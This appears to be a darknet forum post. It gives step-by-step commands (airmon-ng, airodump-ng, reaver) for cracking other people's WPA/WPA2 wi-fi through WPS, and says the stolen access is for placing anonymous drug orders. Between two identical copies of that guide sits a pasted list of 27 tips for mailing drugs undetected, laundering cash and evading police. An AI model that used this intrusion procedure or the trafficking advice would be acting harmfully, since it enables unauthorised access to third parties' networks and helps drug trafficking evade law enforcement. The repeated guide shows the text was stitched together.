Several posts back I offered a way to get on the local wi-fi connections in your area. Since then I have learned of an all together easier method and I thought I would post it here. If you try it and it works (and it WILL) and you want to make a donation thats great if not thats not a problem. Just share this information with other members that need it (newbies) and we will call it fair  ;)

This method is quite simple for WPA and WPA2 connections WEP is different. If you need that PM me and I will write it up here. You can search Youtube or the Internet and get step by step instructions if you have trouble understanding any of the things that are assumed you know in this writing. If you need more information PM me and I will help you with what I can. The shortest version I can come up with is this:

Use your laptop. I havent used anything else myself.

You will need Backtrack5 R3 that you can download by torrent or on the internet.
You will need to put it on a USB drive or DVD.
Boot your computer into Backtrack (BT).
Select "BackTrack Text - Default Default Boot Text Mode" and press enter.
At the prompt type startx and press enter.
Click Applications > Internet > Wicd Network Manager
Select your network and click connect and enter your password and click OK and then click connect a second time.
Click the Terminal button in the menu bar and press the ^ button to expand the screen (the v button minimizes).
At the prompt type apt-get update
After the update completes at the prompt type apt-get install reaver
I disconnect from the Internet but as I understand it doesnt matter.
In the Terminal at the prompt type iwconfig and press enter.
The wireless device in the list should say wlan0 but look for wlan1 or whatever it is and write it down.
Type airmon-ng start wlan0 or whatever yours was wlan1 etc.
The monitor mode interface should say mon0 write it down or whatever it is mon1 etc.
Now we find the BSID of the routers in your area (which are the w-ifi connections in your area!)
At the prompt type airodump-ng wlan0 or whatever yours was.
* If that doesnt work you can try airodump-ng mon0 or whatever it was.
You will see a list of the wireless connections within range.
When you see the network you want press ctrl+c to stop the list from refreshing.
Then either copy the BSSID down on paper or highlight it and right click and copy it. Its the series of letters and numbers and colons on the left side an example would be: DD:6F:3E:B2:DB:18
If you look you will also see the AP SSID or name of the wi-fi signal you want to crack.
The network should have WPA or WPA2 listed under the ENC column.
*WEP needs a different guide PM me if you need it and I will post it here.
At the prompt type reaver -i mon0 (or whatever yours is) -b (here you put your BSSID you copied down or right click copied) -vv
an example would be: reaver -i mon0 -b DD:6F:3E:B2:DB:18 -vv
Then you just press enter and wait. I have had it take 18 hours for one to crack and 8 hours for a different one.

When it DOES crack it will give you a bunch of information:
BSSID: this is the BSSID number you entered.
WPS PIN: this is the pin number it took to crack it after all those tries.
WPA PSK: this is the password or network security key that you need to get on the wi-fi signal you chose. WRITE IT DOWN.
AP SSID: this is the name of the BSSID or wi-fi signal that you wanted to crack.

Thats it. It is very easy and anyone can do it. I pop onto different ones using my TOR on my Tails drive and you can make your orders across a different wi-fi signal then your own. Copy & Pasted this from the vendor forums! Found it to contain some super useful info!

1. Don't ship direct to your residence. Get a secure drop. Derp. Don't ever sign.
2. Don't import. Customs is a bitch.
3. Don't get anything stinky in the mail. 90% of CDs are marijuana detected by drug dogs.
4. Don't tell anyone that you are getting packages. Snitches are the other 10%.
5. Clean your workspace before shipping. Use thick gloves (not latex!) and a hairnet if you are super paranoid or the government has your DNA on file. NEVER leave fingerprints anywhere, even the outside of packages. Put your packages in another envelope and use that envelope to drop it in the blue box.
6. Don't check tracking with TOR unless through a shipping proxy website. This is debatable as I've never seen it directly cause a CD or flag but you can never be too careful.
7. Don't bother trying to hide drugs inside other items. Make your packages as flat as possible and appear to be documents. This is your best bet.
8. Obviously, if shipping high-risk smelly items, MBB is a must. Not shipping such drugs is ideal.
9. Don't develop a pattern. Keep your post office purchases, shipping dates, drop boxes different every time.
10. Switch up packaging, return addresses, fonts, etc. to avoid profile packaging. Remember you are probably shipping to at least a few cops.
11. Avoid face to face at all costs. This is the biggest risk you could take. You are 99% more likely to get busted IRL then online. You get busted F2F and then they find evidence you are shipping, well then there's a few more charges for you.
12. Figure a secure way to cash out and avoid exchanges. Cash in mail to a drop from trusted folks who buy more drugs with it is best. Don't let it link to your real identity at all. Keep your bitcoins in the drug economy.
13, Always use TOR, FDE, encrypted containers, GPG (4096 bit or ECC), OS isolation, disable JavaScript and other insecure technologies. If you are using the TBB on Windows for vending, that's NOT enough. Your best bet is configuring an old laptop with your favorite flavor of Linux, spoofing the MAC address every time and using open WiFi. Do all business under a properly configured Whonix VM. Better yet, use Qubes if your hardware will support it. This way, even if you were exploited, they would need to hack out of your isolated VM. Even if that happened, you'd be on an open WiFi with spoofed MAC that would lead nowhere except your general location which they will already know by ordering from you. Keep no identifying information on this machine. Don't use a laptop with a webcam/microphone built into it. If you must, then disable them in the BIOS and physically block them.
14. Regularly check your car for GPS trackers. Leave your phone at home while doing anything vending related. GPS information is free to the government and not protected under any law, so sayeth the Supreme Court. It can be requested by any LEO without a warrant. At least in the USA, I am pretty sure the mailmen pick up from the blue boxes and it all gets mixed together in the back of the truck with mail from other boxes on their route. Tracking and postmarking doesn't happen until the acceptance facility, so it would be hard to figure out where certain packs were actually picked up without quizzing the army of mailmen directly and even then their memory will be foggy from picking up hundreds of packs a day.
15. Don't ever handwrite addresses. Handwriting analysis is an old tool at this point.
16. Don't use e-mail. It is insecure and can be hacked/seized. If you must, then always use GPG for any sort of communication.
17. Keep the amount of people who know about your operation to the very minimum. Don't brag. Trust no one. Don't think you are a bad-ass drug dealer and are invincible. This is totally immature behavior that will lead to getting busted. If you are in a serious relationship, only tell them if you must and have been with them for years. Remember, if you get busted, they will almost undoubtedly attempt to turn them against you in return for protection. Don't implicate others in your operation in any way if you truly care about them.
18. Always obey traffic laws. Dress like a well respected member of society. Don't speed down the street in a murdered-out Yugo dreaded and dressed in a Slayer shirt blaring your music (extreme example). Remember, cops are always profiling people and pulling them over based on it even if they say they aren't.
19. Have a goal set and then QUIT when you reach it. You don't realize it when you start, but vending is addictive as fuck. It is REALLY hard to stop once you get that kind of cash flow coming in. Remind yourself that everyone gets busted eventually, even those with the best opsec. There is three endings to this situation: prison, death, or quitting while you are ahead (best). At the very least, take long breaks and come back if you truly need to make more money. Think about this... How much money do you REALLY need? A five or six digit goal can turn into seven really quick once you are doing well. Don't be greedy.
20. Hold a good job and don't deposit cash into banks that you can't explain. Stash your cash away and only spend it on small, untracked purchases ($1000 or less) or come up with a good plan to launder it. Going to the bar and dropping a few thousand buying everyone drinks will draw attention pretty fast.
21. Never sell (or store/vend) no crack where you rest at. I don't care if they want an ounce, tell em bounce.
22. Don't give out tracking numbers unless a problem has occurred. If the customer doesn't get this then explain it to them. Addicts are impatient but if they can't deal then tell them to go elsewhere.
23. Only ship from major metropolitan areas. If you live in a small town with one post office and three drop boxes, drive to the nearest metro area to make your drops or forget it. Remember, driving long distances increases your risk of local LE encounters.
24. Obviously, never throw anything vending/drug related in the trash at your residence. Dispose of it by burning it or in public trash cans. Be sure to destroy any identifying information in the waste (address labels).
25. Never say anything on the phone. Your phone is for legit purposes only. Burners are no good. They can identify your voice and pull a new number straight off the cell tower based on statistical analysis. Any sensitive communications must be encrypted. If the people you work with don't use encryption, teach them. If they refuse to learn, find new partners.
26. Be paranoid and observant. Always watch for tails. Remember they work in teams and can be tricky. Use evasive driving.
27. Any rules from F2F dealing also apply here, even I forgot to mention them. If you don't know, listen to The 10 Crack Commandments by Notorious B.I.G.

Use your laptop. I havent used anything else myself.

You will need Backtrack5 R3 that you can download by torrent or on the internet.
You will need to put it on a USB drive or DVD.
Boot your computer into Backtrack (BT).
Select "BackTrack Text - Default Default Boot Text Mode" and press enter.
At the prompt type startx and press enter.
Click Applications > Internet > Wicd Network Manager
Select your network and click connect and enter your password and click OK and then click connect a second time.
Click the Terminal button in the menu bar and press the ^ button to expand the screen (the v button minimizes).
At the prompt type apt-get update
After the update completes at the prompt type apt-get install reaver
I disconnect from the Internet but as I understand it doesnt matter.
In the Terminal at the prompt type iwconfig and press enter.
The wireless device in the list should say wlan0 but look for wlan1 or whatever it is and write it down.
Type airmon-ng start wlan0 or whatever yours was wlan1 etc.
The monitor mode interface should say mon0 write it down or whatever it is mon1 etc.
Now we find the BSID of the routers in your area (which are the w-ifi connections in your area!)
At the prompt type airodump-ng wlan0 or whatever yours was.
* If that doesnt work you can try airodump-ng mon0 or whatever it was.
You will see a list of the wireless connections within range.
When you see the network you want press ctrl+c to stop the list from refreshing.
Then either copy the BSSID down on paper or highlight it and right click and copy it. Its the series of letters and numbers and colons on the left side an example would be: DD:6F:3E:B2:DB:18
If you look you will also see the AP SSID or name of the wi-fi signal you want to crack.
The network should have WPA or WPA2 listed under the ENC column.
*WEP needs a different guide PM me if you need it and I will post it here.
At the prompt type reaver -i mon0 (or whatever yours is) -b (here you put your BSSID you copied down or right click copied) -vv
an example would be: reaver -i mon0 -b DD:6F:3E:B2:DB:18 -vv
Then you just press enter and wait. I have had it take 18 hours for one to crack and 8 hours for a different one.

When it DOES crack it will give you a bunch of information:
BSSID: this is the BSSID number you entered.
WPS PIN: this is the pin number it took to crack it after all those tries.
WPA PSK: this is the password or network security key that you need to get on the wi-fi signal you chose. WRITE IT DOWN.
AP SSID: this is the name of the BSSID or wi-fi signal that you wanted to crack.
